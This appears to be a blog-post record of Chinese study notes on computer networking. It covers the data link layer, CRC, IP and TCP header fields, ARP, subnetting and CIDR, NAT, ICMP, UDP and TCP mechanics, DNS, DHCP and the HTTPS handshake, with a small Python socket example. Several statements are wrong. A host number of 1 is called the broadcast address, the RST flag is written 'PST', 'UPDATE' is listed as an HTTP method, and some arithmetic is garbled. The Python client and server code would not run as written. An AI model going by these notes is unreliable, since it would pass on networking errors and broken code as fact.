Unit）\n以太网的MTU（MAC帧）是1500字节\n路径MTU：由链路中MTU的最小值决定\n差错监测：因为物理层只负责传输比特流，没有控制出错的功能，因此数据链路层提供了差错监测的功能\n奇偶校验码：在发送的每个字节后加上一位，让字节中为1的数可以是奇数或者偶数，通过奇偶校验来确定数据是否出错，具体可以看https://xiaochenabc123.test.com/archives/77.html这篇文章，讲TCP的可靠性那里\n奇偶校验码的缺点就是如果发生2位的出错，就无法校验出来错误\n循环冗余校验码CRC（根据传输或者保存的数据来产生固定位数的校验码，校验码再附加到数据的后面）\n模二除法：通过异或来表示0或者1，例如00就是0，01就是1，异为1，或为0\n选择用于校验的多项式，并且在数据后面添加多个0，添加多个0的数据，通过模二除法来除以校验的多项式的位串，得到的余数将填充到原来数据的添加多个0的位置，来得到可校验的位串\n假设校验的多项式为X3+X2+1，那么就是原数据后面添加3个0（添加多少个0取决多项式的最高阶，二进制位的最高位也取决于最高阶（最高幂次）二进制位数等于最高阶+1，这里就是表示的二进制位为4位的二进制数），二进制位串位计算就是1x3+1x2+0x1+1x0，就是1101\n例如原数据为1010110，CRC校验码计算就是1010110000除以1101，得到的余数0001就是CRC校验码，在将原来填充0的位置填充CRC，就是10101100001，这个比特流就是要传输的数据\n接收数据进行校验通过，传输的数据除以位串，来得到余数，根据余数来进行判断校验（余数为0则表示数据正确）\n数据链路层只检测数据的错误，不会进行数据的纠错，数据错了，数据链路层将会丢弃错误的数据或者重新传输数据\nMAC地址（物理地址，硬件地址，每个设备都有唯一的MAC地址，用48个比特位来表示，使用16进制）\nMAC地址表：映射MAC地址到硬件接口上\n以太网协议是数据链路层的协议，以太网协议是局域网技术，以太网协议用于完成相邻设备的数据帧传输\n网络层（数据路由，数据在网络传输的路径，跨局域网，跨节点）\n路由器的顶层是网络层，没有使用到传输层和应用层\n网络层的ip协议，子网划分\n虚拟互连网络（物理网络复杂，使用IP协议时，将无需关心物理网络的差异）\n网络层利用IP协议来将使用IP协议的计算机连接起来，就好像这些计算机只需要连接一个虚拟互连网络一样，无需关心底层经过了哪些网关，路由器，ISP等等，将专注于数据的转发工作\nIP协议\nIP地址（v4只有32位，v6有128位），ipv4使用点分十进制表示，使用4组从0到255的数字表示ip地址，ipv6使用冒分十六进制，用8组4位的16进制表示ipv6地址\nIP协议处理数据是数据链路层处理完毕的数据帧的数据，又叫IP数据报，IP数据报包含了目标的IP地址，源IP地址，IP数据，协议数据等等\nIP数据报的4位版本，就是IP协议的版本，使用4位二进制表示，通信双方必须一致（否则无法通信），例如版本4（v4），版本6（v6）\nIP数据报的4位首部长度，是表示IP首部的长度，使用4bit表示，4位填满就是1111，就是15bit，IP数据报限制每行是4个字节（32位bits），154就是60字节，因此首部最大可以是60个字节，IP数据报最短部分有5行，54，就是20字节，20字节是IP首部长度最小的值，这个看起来可能有点乱，下面解一下为啥是这样\n首部长度的单位是32bit（4字节），也就是说首部长度0001是表示IP首部有32bit，4个字节，首部长度1111就是4*15（15是二进制1111换算出来的），就是IP首部最大是60个字节\n因为IP数据报最少要有5行，这5行就是最小首部（第六行是可选的），每行4个字节，4*5就是20个字节，IP首部长度最小表示得是20个字节，用4位首部长度表示就是0101（就是5，因为1就表示了4个字节）\nIP数据包的总长度是用16位bit表示，因此最大值为65535（2的16次方），这个总长度表示IP首部+IP数据的总长度，因此一个IP数据包最大是65535字节\n当IP数据包大于MTU时，数据链路层会将IP数据包分片，以确保符合MTU\nIP首部还有个服务类型，用8位表示，前面3位表示优先级，后4位是标志，最后一位是保留位，前面3位，满载就是111，也就是说有7种优先级，这个优先级没有强制性，物理设备也不看\nIP首部标识，占16位，是计数器，相同数据包的标识是相同的（每生产一个数据包就+1），用来数据包的分段，以确保IP数据包能通过MTU限制的数据链路，最后为了数据帧拼装成完整的IP数据包，通过标识来确定，这个标识会被复制到数据帧的标识字段中，相同标识就表示是相同的IP数据包，就可以拼装成完整的数据包了\nIP首部标志，占3位，只有2位有意义，表示该IP数据包是否分片，第一位没有使用，第二位表示DF（Don\u0026rsquo;t Fragment），是否要进行分帧（DF=0时才允许分片），第三位表示MF(More Fragment)，是否后面数据报（MF=0时表示该数据包后面没有了，是最后的包），因此一个允许被分片，并且不是最后一个数据包时，标志表示为001，不允许分帧的话，超过MTU限制的数据包将被丢弃，并且向数据包的源头提示信息\nIP首部片偏移，占13位，表示分片后，该片在原来ip数据包中的相对位置，片偏移是用8个字节为一个偏移单位，因此每个片的长度一定是8字节的倍数\n生存时间TTL，占8位，表示该数据报文在网络中的寿命，经过一个设备TTL会减1，当TTL为0时，该数据报文将被设备丢弃，确保数据报不会一直在互联网的设备中传输，而消耗网络资源\n协议，占8位，表示数据报携带的数据是什么协议的，让网络层知道应该将这个数据给哪个来进行处理，常见的协议取值，1为ICMP，2为IGMP,4为IP，6为TCP，17为UDP\n首部检验和，占16位，用来校验数据报的首部，每经过一个设备，都会重新计算首部检验和，确保首部不出错，出错会被设备丢弃\nIP源地址，占32位，表示发送该IP数据报的机器的IP地址\nIP目标地址，占32位，表示该IP数据报需要到达的目标机器的IP地址\nIP协议转发过程（逐跳（hop-by-hop））\nMAC地址表工作过程：网卡发送数据帧，数据帧抵达路由器，路由器会取前6字节，来匹配MAC地址表，查找该MAC地址对于的网络接口，路由器就可以通过网络接口来对外发送数据帧\nIP路由表和MAC地址表工作过程类似，IP路由表有目标IP地址，以及有要到达该目标IP地址的下一个地址，发出IP数据报，通过查询IP路由表得知，需要将改数据报发送给另一个IP，才能到达就会发送给另一个IP，另一个IP的设备查询路由表，需要给另一个IP，就发送给它，一直到抵达目的地，或者TTL死亡，计算机和路由器都有路由表\nIP路由表是网络设备根据路由协议生成的，windows操作系统可通过route print命令查看本计算机的路由表\n可以看到有5个属性，分别是网络目标（目标的IP）和网络掩码（表示IP地址的哪个标识是当前设备所在的子网），网关（将数据发送给哪个设备，网关又叫下一跳服务器），接口（发送数据包的网络接口，和当前网关是同一个子网）以及跃点数（到达目标需要经过的跃点数量，一个跃点就是一个路由器，TCP/IP协议会选择最低跃点数的路由）\n网络掩码，又叫子网掩码，和IP地址搭配使用，子网掩码也是32位地址，用来屏蔽IP地址的一部分来区别是网络地址和主机地址，RFC950定义，表示网络地址的位都为1，表示主机地址的位都为0，例如192.168.1.2的子网掩码255.255.255.0，表示192.168.1是网络地址，最后的2才是主机地址，因此得到192.168.1.2是属于192.168.1.0这个网络下的，其中主机号为2\n逐跳的过程：网络层通过路由表，知道下一个发送哪个设备来转发数据，网络层将封装IP数据报给数据链路层，并且告知目标的MAC地址是什么，数据链路层将数据帧发送给目标MAC地址，当接收数据帧后，会将数据帧给网络层（这也是为啥路由器最高层是网络层的原因，路由器不需要那么高层的功能），网络层查询路由表，得知下一个目标设备，并且将数据报给数据链路层，告知目标的MAC地址是什么，数据链路层会将数据帧发送给目标设备一直到真正的目标设备为止\n数据帧在每一逐跳中，都会对MAC地址发送改变，但是IP数据报的IP地址不会发生变化\nARP协议（Address Resolution Protocol，地址解析协议）和RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）\nARP协议会将网络层的IP32位地址解析成数据链路层的MAC48位地址，ARP缓存表表示IP地址和MAC地址的映射关系，缓存表没有缓存时，ARP会广播，其他设备会回应，ARP将记录设备的IP和MAC地址，ARP缓存表的记录具有期限性\nwindows操作系统可通过arp -a命令查看本机的ARP缓存表\nARP协议报文是直接对数据链路层的数据帧进行封装的\nARP协议报文由2位的类型，28位的ARP请求应答，18位的PAD填充数据组成\n其中28位的ARP请求应答报文，是由2位硬件类型，2位协议类型，4位标记，6位发送方的以太网地址，4位发送方的IP地址，6位的目标以太网地址，4位的目标IP地址组成\nRARP的工作和ARP是逆操作，RARP协议是将数据链路层的MAC地址解析成IP地址，利用的也是ARP缓存表，RARP报文和ARP报文是一样的类型组成的\nIP地址的子网划分\nIP地址分类，将32位分成网络号，主机号\nA类地址：8位网络号（前一位为0），24位主机号，最小网络号为0，最大网络号为127（01111111），最小主机号为0.0.0，最大主机号为255.255.255\nB类地址：16位网络号（前二位为10），16位主机号，最小网络号为128.0，最大网络号为191.255，最小主机号为0.0，最大主机号为255.255\nC类地址：24位网络号（前三位为110），8位主机号，最小网络号为192.0.0，最大网络号为223.225.255，最小主机号为0，最大主机号为255\n特殊的主机号，主机号为0表示当前网段，主机号为1表示是广播地址，对当前网段的全部设备发送消息用的\n特殊的网络号，A类地址中网络号全为0为特殊网络，例如0.0.0.0，A类地址中网络字段后7位为1是表示回环地址，例如127.0.0.1\nB类地址网络号后14位都为0，例如128.0.0.1，C类网络号后21位为0，例如192.0.0.1\n上面特殊的都是不可使用或者无法分配的\n区别IP地址属于那一类地址，只需要将IP地址的前8位取出来，通过判断前1位到3位来知道，也是可以看前一段IP地址，例如192.168.1.1，这个明显超过A类，B类地址的最大网络号，因此是C类地址\n127.0.0.1本地回环地址（Loopback Address），这个地址不属于任何一个地址类，它表示设备的本地虚拟接口，甚至无网卡也可以ping通该地址\n还有D类地址，开头前4位是1110，E类地址前4位为1111，D类和E类地址用来特殊用途的，例如广播（D类），D类和E类是不区分网络地址和主机地址的\n子网划分就是在网络号主机号的基础上添加子网号，通过子网掩码来匹配网络号\nA类地址的子网掩码是255.0.0.0\nB类地址的子网掩码是255.255.0.0\nC类地址的子网掩码是255.255.255.0\n子网掩码的二进制与IP地址的二进制进行与运算（位相同，并且为1返回1，位不相同，而且为0返回0），得到的运算结果转换为点分10进制，就是该IP属于这个IP的子网\n无分类编址CIDR（Classless Inter-Domain Routing，无类域间路由选择，没有ABC这些网络分类，也没有子网划分）\nCIDR将IP区分为网络前缀和主机号，网络前缀相同就表示是一个CIDR地址块，网络前缀不受限制\n斜线记法，例如192.168.1.2/25，表示前25位为网络前缀，后7位为主机号（2的7次方，就是128，去掉最大和最小的，还有126个ip地址可以分配，而不需要像C类地址一样，直接就分配255-2个地址，造成地址浪费）\n通过斜线记法占据网络前缀，主机号将可以灵活的占用，更有效分配IP地址，减少IP地址分配的浪费\nCIDR的IP地址与子网掩码，进行与运算，可以得到网络号\n网络地址转换NAT技术（解决IPv4地址不够用）\nNAT技术将IP分为内网地址（避免和外网地址重复）和外网地址（又叫公网地址）\nA类内网地址，10.0.0.0到10.255.255.255\nB类内网地址，172.16.0.0到172.31.255.255\nC类内网地址，192.168.0.0到192.168.255.255\n网关以及ISP，服务器使用外网地址，内部局域网使用内网地址\nNAT（Network Address Translation，网络地址转换）：让多个内网设备通过一个公网地址来访问互联网的技术，通过转发端口号来实现，内部的端口号，需要访问外网时，会分配一个新的端口号和新的地址（公网）来表示这个内网端口服务，这样外网访问这个公网的端口时，将可以映射给具体内网的端口服务\n例如常见的NAT穿透技术（就是内网穿透）\nICMP协议（Internet Control Message Protocol，网际控制报文协议）\nICMP协议可以报告错误信息和异常信息，搭配IP协议使用\nICMP协议报文封转在IP数据报的数据中，ICMP协议报文由ICMP报文首部和ICMP报文数据组成\nICMP报文首部由8位类型（ICMP报文的类型，有2类，分别是差错报告报文，询问报文），8位代码（ICMP报文具体有哪些错误），16位的校验和组成\n差错报告报文的常见类型有3（终点不可达，代码0为网络不可达，1为主机不可达），5（重定向，代码0为网络重定向，1为主机重定向），11（传输超时），12（缺少IP必要参数（1）或者IP头部问题（0））\n询问报文的常见类型有0或者8（回送请求或者应答），13或者14（时间戳请求或者应答），询问报文主要查询网络是否互通，\n使用了ICMP协议的应用有ping（询问报文），traceroute（发送IP数据包到目标需要走哪些路由）\nwindows可使用tracert命令来体验traceroute的功能，tracert baidu.com\n传输层（给上层应用层提供通信功能，是数据通信的最高层，传输层实现进程与进程间的通信（跨设备，跨设备））\n传输层协议：TCP协议和UDP协议\n使用不同的端口表示不同的网络进程，端口使用16位表示，（0到65535），端口只对本地有意义，进行网络传输，还需要搭配IP来使用\n传输层对上层应用层起到屏蔽底层的细节的作用，网络层传输点到点的传输，传输层就将点精确到端，进程的传输\nUDP协议（User Datagram Protocol，用户数据报协议）\n应用层传递的数据报，UDP不会对其进行合并，拆分，UDP协议数据报大小取决于上层网络层的数据报\nUDP数据报分为UDP首部，UDP数据报数据（UDP数据报数据就是上层应用层提交的数据）\nUDP首部由16位源端口号（源机器的端口），16位目标端口号（目标机器的端口），16位UDP长度（表示UDP数据报的长度），16位UDP校验和组成，UDP首部是8字节的长度\nUDP无连接（不需要建立连接，直接对目标发送数据报），不保证可靠传输数据（不会感知数据报的发送失败，丢失），面向报文传输（应用层交付的数据报文有多大，UDP就传输多大的UDP协议报文，一次发送一个报文），没有拥塞控制（无法感知网络的拥塞情况，直接交付数据报给网络就完事）\nTCP协议（Transmission Control Protocol，传输控制协议）\nTCP协议报文也是在IP数据报的数据内部的，由TCP首部和TCP数据报数据组成\nTCP是面向连接（需要提前建立连接，才能通信），提供可靠传输（连接管理（3次握手，4次挥手），数据分段（），校验和（校验数据），序号（按顺序发送，收到乱序则丢弃数据），累计确认（接收数据方会发送确认应答，来表示发送的报文收到了），重发机制（定时器，一段时间内无法确认该报文接收到，发送方会重新发送该报文），流量控制（感知对方的接收情况，如果对方接收不够快，会提示对方降低发送频率（调整本地的窗口，并且告知对方窗口值是多少），避免数据报的丢失），拥塞控制（感知网络拥塞情况，能根据拥塞情况来调整数据发送的频率，调整拥塞窗口，避免数据报的丢失），通过这些来保证可靠传输），提供全双工通信，面向字节流传输\nTCP字节流：TCP协议将网络层传输的数据看成字节流，会从字节流中选择长度来创建数据段（拆分），这个数据段就成了TCP数据报的数据，接收方接收数据时，还需要对数据进行排序（根据序号，合并）\nTCP粘包：发送的数据，在接收方被粘在一块了（排序），一个数据包的头部接着另一个数据的尾部，导致原因是接收数据时，并不会马上交付数据，而是存储在流量控制的缓存中，交付数据时就可能读取到TCP粘包\nTCP首部由16位源端口，16位目标端口，32位序号（传输的字节都有唯一序号，表示数据报的数据的第一个字节的序号），32位确认号（表示前面多少个数据收到了，如果有下一个数据请发送给我，例如ack=11，表示前面10个数据已经收到，可以发送第11个数据了，表示期待收到下一个字节序号是什么，传输下一个数据报的数据取决于这个，序号+当前数据长度的和就是下一个数据发送的起点序号），4位数据偏移（首部长度，最大长度1111，就是15，表示有15行，每行4字节，最大60个字节，单位为4字节，长度是20（最少20字节）到60字节之间，表示真实数据距离首部有多长），保留字段，6位的TCP标记（有6位不同的控制位，分别为URG（Urgent，紧急位，URG=1，表示该数据是紧急数据，接收端会更优先获取该数据），ACK（Acknowledgenent，确认位，ACK=1时确认号才生效），PSH（Push，推送位，PSH=1时表示尽快将该数据交付应用层，不需要等缓存填满交付），PST（Reset，重置位，RST=1时通知重新建立TCP连接），SYN（Synchronization，同步位，SYN=1，ACK=0时表示需要连接建立请求，ACK=1时表示连接请求报文），FIN（Finish，终止位，FIN=1时，表示数据发送完成，开始断开连接操作）），16位窗口（表示本地可以接收的数据最大多少，字节为单位，流量控制的基础，可变），16位校验和（差错控制，发送方计算全部数据的校验和，接收方也计算校验和，当接收方的校验和和发送方一致时，数据发送正确），紧急指针（搭配URG控制位使用，指定紧急数据在报文的位置），可选的TCP选项（最大40字节），以及填充（填充32位的整数倍）组成\nTCP首部除了填充，TCP选项外，剩余是固定20个字节的长度的\n可靠传输协议：停止等待协议（发送方发送数据，只有当接收方响应确认后，再发送另一个数据，停止是发送方的停止发送另一个数据，等待是接收方等待数据的传输，获取到了响应一个确认，如果接收方在一段时间内没有响应确认消息，发送方会重发该数据给接收方（超时重传，超时定时器）），连续ARQ协议（连续发送多个报文，批量发送，通过滑动窗口，来确认发送多少个报文，当报文确认号到达，将移动窗口，让其可以发送后面的报文，累计确认）\nTCP可靠传输基于连续ARQ协议，滑动窗口是以字节为单位，窗口首个字节就是确认号（期望下一个发送该字节），发送字节的长度等于确认号+窗口大小，移动窗口的前提是已经接收到确认了，可用窗口等于窗口长度-已发送未确认的，如果窗口首个字节长时间没有确认，将重新传输该窗口的全部字节（哪怕已经接收到）\n因为重传窗口的全部字节效率低，因此有选择重传，可以指定重传的字节，每个字节都有32位序号，提供序号就可以选择性重传，选择重传的数据存储在TCP选项内部，因为TCP首部最大60字节，因此TCP选项最大40字节，也就是10个序号（一个序号4字节），能存储的序号太小，因此实质上存储的是重传的字节边界，重传开头字节到结尾字节，就是2个协号表达一段需要重传的字节，这会增加了重传字节的数量，而不是每次只能重传10个字节，而是能重传数百个，数万个字节，因为丢失字节的数量是非常巨大的，要么没有问题，一出问题就是字节丢失很多\n流量控制（提示发送方的发送数据的频率不要太快（避免接收方处理不及时，而导致数据丢失），通过限制滑动窗口的大小来实现，窗口指明发送的数据量是多少）\n发送方发送数据时携带SEQ序号，表示该报文的序列号，接收方进行响应时，会返回ACK确认号（表明接收到哪个报文了），如果想提示发送方的窗口要设置多大合适，还可以响应一个RWND来表示发送方应该设置窗口大小为这个\nACK=101，RWND = 1000，将表示下一个发送序号为101的报文，并且窗口为1000，也就是说可以一次传输101到1100之间的报文\n通过窗口大小来通知对方的发送速率，来做到流量控制，超时重传只针对数据的，对于响应消息是不会触发重传的，如果窗口控制的消息丢失了，将可能导致死锁（如果之前设置RWND为0的话，需要等待响应调整窗口，窗口消息丢失，接收方和发送方都在等待对方的回应）\n坚持定时器：当接收到RWND为0的消息时，启动坚持定时器，坚持定时器将每隔一段时间发送窗口探测报文，询问接收方是否有调整窗口的大小的操作，避免因为窗口消息的丢失而死锁的情况发送\n拥塞控制（硬件设备传输速率不同或者网络设备故障，因此存在网络拥塞的情况，例如报文超时，这个也是被认为网络拥塞了）\n拥塞控制算法：慢启动算法（从小到大逐渐增加发送量，当发送的报文接收到了，将增加发送量，逐渐试探网络是否拥塞了，会指数增长发送量，直到慢启动阈值（ssthresh）），拥塞避免算法（当慢启动算法达到慢启动阈值时启动，控制拥塞窗口，会试探扩大拥塞窗口（直线增长），直到发送网络拥塞为止）\n三次握手（通过TCP首部的TCP标记完成，ACK，SYN，FIN）\n第一次握手：SYN=1，seq=x，seq是序号，请求建立连接方向目标发送\n第二次握手：SYN=1，ACK=1，seq=y，ack=x+1，ACK确认收到请求，seq的值是数据序号，ack=x+1，是希望下次接收的数据的序号\n第三次握手：ACK=1，seq=x+1，ack=y+1，ACK确认，seq是当前发送的数据序号，ack是期望下次接收的序号\n发送方负责同步和建立连接，接收方负责监听和同步数据已接收响应，建立连接\n三次握手的作用不只是建立连接，而且还可以同步数据的序号，以及希望下次接收数据的序号，避免失效的请求建立连接报文（超时的）而导致错误，第三次握手消息，会让接收方忽略超时的失效的建立连接报文（因为超时没有响应，会重发请求）\n四次挥手（TCP连接的释放）\n第一次挥手：FIN=1，seq=u，数据传输完毕，需要终止TCP连接\n第二次挥手：ACK=1，seq=v，ack=u+1，被终止方依然可以发送数据，因为只是主动终止方发送完毕数据了，对方并不一定完成了，需要等待对方发送完毕\n第三次挥手：FIN=1，ACK=1，seq=w，ack=u+1，被终止方发送数据完毕，也可以终止了\n第四次挥手：ACK=1，seq=u+1，ack=w+1，请求终止方确认已经接收到对方可终止的请求后发送，可以释放了\n等待计时器：请求终止方需要等待计时器后才进行关闭，而被终止方接收到第四次挥手消息后是立刻关闭，这个计时器又叫2MSL计时器，即报文最大生存时间的2倍（MSL，Max Segment LIfetime，最长报文段寿命，一般为2分钟）\n等待计时器的作用是确保第四次挥手消息到达对方，如果对方在2MSL内没有接收到，会重新发送第三次挥手消息，确保全部报文在连接中失效，端口占用\n套接字（ip和端口的组合，Socket，表示TCP连接的一端，用来数据发送和接收）\nTCP连接使用2个套接字来组成（C/S架构）\n服务端创建套接字，绑定套接字，监听套接字，接收或者处理消息\n客户端创建套接字，连接套接字，发送消息\n套接字编程（使用Python完成）\n服务端\nimport socket\rdef server():\rs = socket.socket() #创建套接字\rhost = '127.0.0.1'\rport = 8080\rs.bind((host,port)) #绑定套接字\rs.listen(10) #监听\raddr = s.accept() #接收对方发送的消息\raddr.send('hallo word') #向对方发送消息\raddr.close() #关闭连接\rif __name__ == '__main__':\rserver()\r客户端\nimport socket\rdef client():\rs = socket.socket() #创建套接字\rs.connect('127.0.0.1',8080) #连接端口\rprint(s.recv(1000)) #接收服务端消息\rs.close() #关闭连接\rif __name__ == '__main__':\rclient()\r应用层（对接用户的一层，定义应用与应用之间的通信规则）\n应用层常见协议：HTTP，SSH，DNS，FTP，SMTP，POP3，Telnet\nDNS（Domain Name System，域名系统）\n使用域名来代替IP的点分十进制，通过DNS服务，可以将域名映射出源IP地址（这个源可能是源服务器，也可能是代理服务器，缓存服务器，CDN服务器）\n域名由点，数字，字母组成，这个字母不区分大小写，点分割不同域（这里的域主要分顶级域，二级域，三级域）\n例如：blog.xiaochenabc123.test.com，.com就是顶级域，xiaochenabc123.test.com是二级域，blog.xiaochenabc123.test.com是三级域\n顶级域分成通用顶级域和国家（地区）顶级域，例如.cn，.com，.org，.net，.gov\n顶级域搭配二级域就是可以完成一个IP映射服务了\nDNS服务部署在DNS服务器上（域名服务器），根域名服务器（管理所有顶级域，全世界目前只有13台），顶级域名服务器（负责顶级域的DNS解析工作），域名服务器（负责二级域的解析工作）\nDNS解析过程：计算机访问本地域名服务器查询，如果本地域名服务器没有缓存，则直接向根域名服务器请求，这个顶级域是属于哪个顶级域名服务器的，根域名服务器会返回对应的顶级域名服务器信息，本地域名服务器然后对顶级域名服务器查询，这个二级域名应该属于哪个域名服务器，再访问域名服务器，最后获取映射的IP\n本地域名服务器决定了DNS解析的时长，一个好的本地域名服务器可以减少向根，顶级，域名服务器的请求，例如公共域名服务器，114.114.114.114，8.8.8.8，119.29.29.29，223.5.5.5，180.76.76.76\n域名由 ICANN 管理全世界的域名系统工作\nDNS也会被缓存到本地计算机内，浏览器缓存，操作系统缓存，因此实质上是先访问浏览器缓存，没有再访问操作系统缓存，再然后才到本地域名服务器\nDHCP协议（Dynamic Host Configuration Protocol，动态主机设置协议）\nDHCP协议是局域网协议，调用UDP协议的应用层协议，提供即插即用联网服务（不需要手动设置IP，而是使用DHCP协议提供的服务，动态设置IP）\nDHCP协议提供的是临时IP，具有租期性（过期了会回收，当然也可以续租），提供DHCP协议服务的是DHCP服务器，该服务器通过监听默认端口67，计算机通过UDP协议进行广播DHCP发现报文，因为当前计算机还没有分配IP，会通过设置ip的位全为1，就是255.255.255.255为UDP协议报文的ip，表示这个报文是广播报文，DHCP服务器接收到发现报文后发出DHCP提供报文，计算机接收DHCP提供报文，知晓该网络提供DHCP服务，计算机会向DHCP服务器发送DHCP请求报文，DHCP接收请求并且回应，提供IP地址\nHTTP协议（HyperText Transfer Protocol，超文本传输协议）\nHTTP协议是调用TCP协议的应用层协议，基于TCP的数据可靠性传输\n服务端处理过程：接受客户端TCP连接，接收请求报文（HTTP请求方法有很多种，常见的有GET，POST，DELETE，UPDATE，PUT等等），处理请求，访问资源，生成响应报文，发送响应报文给客户端\n请求报文由请求方法，请求地址，HTTP版本，请求头，请求内容组成\n响应报文由HTTP版本，响应状态码，状态解释，响应头，响应内容组成\nHTTPS是在HTTP协议的基础上使用了SSL（Secure Sockets Layer，安全套接层），数字证书加密通信，SSL证书由可信任组织（CA机构）颁发给所有人的，CA机构颁发的证书就叫CA证书，CA证书有很多种，SSL证书是CA证书的一种，数字证书主要由证书序列号，签名算法，有效期，所有人名称，所有人公开密钥组成\nSSL提供了数据加密传输，数据不可篡改等功能，应用层的数据交付给传输层会经过SSL的加密传输\n先进行443端口的TCP连接，SSL安全握手，完成安全握手后就可以对数据进行加密解密\nSSL安全握手的过程：\n客户端向服务端发送协议版本，支持的加密算法，随机数1\n服务端回应，发送确定的加密算法，数字证书，随机数2\n上面2次是不进行加密传输的，下面的才进行加密传输\n客户端会先检查数字证书有效性，使用数字证书提供的公开密钥对随机数3进行加密，并且将加密数据发送给服务端\n服务端接收到加密数据时，使用私有密钥解密这个随机数3\n客户端和服务端会根据之前生成的随机数1，随机数2，随机数3和确认的加密算法生成对称密钥\n客户端和服务端将使用这个对称密钥来进行加密和解密传输，这个对称密钥只有客户端和服务端知道，外人并不知道（因为随机数3是使用数字证书的公钥加密的，这个随机数3只有客户端和服务端解密后知道）\n","permalink":"https://99999.fun/posts/156/","summary":"计算机网络是通用，可编程的硬件组成的，并且这些设备可互连，并且可以传输不同类型的数据\n计算机网络不是只有软件概念，还有硬件设备，例如：网卡，网线，路由器等等\n网络作用范围：广域网（WAN），城域网（MAN），局域网（LAN）\n计算机网络发展历史\nARPANET（1969年，美国国防部创建的单个网络）\n三层结构互联网（现代互联网雏形，当时主要用于连接美国学校，实验室的计算机，主干网，地区网，校园网）\n多层次ISP互联网（ISP指网络服务提供商（Internet Service Provider），常见网络服务提供商有中国移动，中国电信，中国联通等等）\n多层次ISP互联网，分主干ISP（主要跨国通信），地区ISP（主要局部地区通信，例如广东移动，北京电信等等）\n中国创建了多个公共互联网，例如：中国电信互联网（CHINANET），中国移动互联网（CMNET），中国联通互联网（UNINET），中国教育与科研计算机网（CERNET），中国科学技术网（CSTNET）等等\n计算机网络层次结构（确保数据通信顺通，识别目标计算机的状态，数据是否存在错误）\n层次结构大概分3个，网络应用，数据通信，物理网络\n层次细分的话，有七层，也就是OSI七层模型（OSI国际标准定义的），而且每个层都是独立的（不干预其他层），只完成不同的工作\nOSI七层模型：应用层（为计算机提供服务），表示层（数据处理），会话层（管理通信会话），传输层（管理通信连接），网络层（数据路由），数据链路层（管理节点之间的数据通信，例如传输数据到另一个局域网），物理层（计算机物理设备）\nOSI七层模型并没有成为广泛使用的标准，而是采用TCP/IP四层模型\nTCP/IP四层模型：应用层（对于OSI七层模型的应用，表示，会话，HTTP协议），传输层（OSI七层模型的传输层，TCP/UDP协议），（OSI七层模型的网络层，IP/ICMP协议）网络层，（数据链路层和物理层，ARP/RARP协议）网络接口层\n计算机网络性能指标\nbps=bit/s，1秒多少比特位，比特率\n时延：发送时延（数据bit除以bps），排队时延（数据等待被网络设备处理的时间），处理时延（数据到达目标机器后处理需要的时间），传输时延（传输路径除以bps）\n总时延 = 发送时延+排队时延+传输时延+处理时延\n往返时间RTT（Route-Trip Time）：数据报文在通信中来回一次的时间（可通过ping命令来查看RTT）\n物理层（连接不同的物理设备，传输比特流）\n物理层传输介质：双绞线（又分屏蔽和无屏蔽，区别就是增加了一层屏蔽层），同轴电缆，光纤（通过光传输，光纤内部是具有高折射率的纤芯，能折射光）\n电缆使用铜作为传输介质，光纤通过光来作为传输介质\n铜线中的电信号传播速度大约为2.3*10^8m/s\n光纤中光信号的传播速度是2.0*10^8m/s\n因此实质上电缆的传播速度比光纤快，因为光纤是利用光的反射来传输到远方的，实质光走的距离更长\n但是电缆的铜在远距离的情况下，会导致衰减（主要有2个原因导致，介质损耗（通过电磁波传导，会在介质中产生电场的电荷规则排序，这会消耗能量）和导线损耗），需要通过中继器来延续信号\n因此在跨市，跨城，跨省，跨国使用都是光纤（光纤的带宽比电缆好，也是一个原因），但是短距离，得益于电缆的传播速度，会更好，因此局域网内部大多使用电缆来传输（因为解析光信号，还需要个光信号调制调解器，计算机无法直接使用光纤传输的数据）\n比特流：通过高低电平来表示比特流，来传输数据\n信道（往一个方向传输信息的媒体，一个通信电路最少要有一个发送信道和接收信道）\n信道的分类：单工通信信道（只能往一个方向通信的信道，没有反馈的信道，例如电视机的电视闭路线），半双工通信信道（可以发送和接收信息，但是不能同时发送，同时接收），全双工通信信道（可以同时发送，同时接收）\n物理层会实现信道分用复用技术（提升信道的利用率）\n频分复用，时分复用，波分复用，码分复用\n数据链路层（封装成帧，透明传输，差错监测）\n数据帧：数据链路层中数据的基本单位，数据发送方会在网络层的一段数据的前后添加特定标记，而这一段数据就是数据帧，数据接收方根据特定标记来识别数据帧，是数据链路层内部数据处理成帧\n数据帧也分MAC帧（没有帧尾，因为MAC帧之间是96比特时间，帧头也是没有的，而是让物理层给MAC帧添加8bts的前导码），PPP帧（有帧头和帧尾，帧头到帧尾就是这个帧的长度）\n封装成帧：数据链路层会将网络层交付的数据报文添加帧头和帧尾，让其成为帧\n帧头和帧尾都是特定的控制字符（比特流），帧头（SOH）：00000001，帧尾（EOT）:00000100\n透明传输：数据链路层对网络层提供的数据没有限制（控制字符在帧数据中，但是不会去当成数据去处理，就好像帧头和帧尾不存在一样）\n字节填充（对数据内部的数据填充ESC转义字符），比特填充（零比特填充法：在每5个连续的1后面插入比特0）\n数据链路层规定了帧的数据的长度限制，就是最大传输单元MTU（Maximun Transfer Unit）\n以太网的MTU（MAC帧）是1500字节\n路径MTU：由链路中MTU的最小值决定\n差错监测：因为物理层只负责传输比特流，没有控制出错的功能，因此数据链路层提供了差错监测的功能\n奇偶校验码：在发送的每个字节后加上一位，让字节中为1的数可以是奇数或者偶数，通过奇偶校验来确定数据是否出错，具体可以看https://xiaochenabc123.test.com/archives/77.html这篇文章，讲TCP的可靠性那里\n奇偶校验码的缺点就是如果发生2位的出错，就无法校验出来错误\n循环冗余校验码CRC（根据传输或者保存的数据来产生固定位数的校验码，校验码再附加到数据的后面）\n模二除法：通过异或来表示0或者1，例如00就是0，01就是1，异为1，或为0\n选择用于校验的多项式，并且在数据后面添加多个0，添加多个0的数据，通过模二除法来除以校验的多项式的位串，得到的余数将填充到原来数据的添加多个0的位置，来得到可校验的位串\n假设校验的多项式为X3+X2+1，那么就是原数据后面添加3个0（添加多少个0取决多项式的最高阶，二进制位的最高位也取决于最高阶（最高幂次）二进制位数等于最高阶+1，这里就是表示的二进制位为4位的二进制数），二进制位串位计算就是1x3+1x2+0x1+1x0，就是1101\n例如原数据为1010110，CRC校验码计算就是1010110000除以1101，得到的余数0001就是CRC校验码，在将原来填充0的位置填充CRC，就是10101100001，这个比特流就是要传输的数据\n接收数据进行校验通过，传输的数据除以位串，来得到余数，根据余数来进行判断校验（余数为0则表示数据正确）\n数据链路层只检测数据的错误，不会进行数据的纠错，数据错了，数据链路层将会丢弃错误的数据或者重新传输数据\nMAC地址（物理地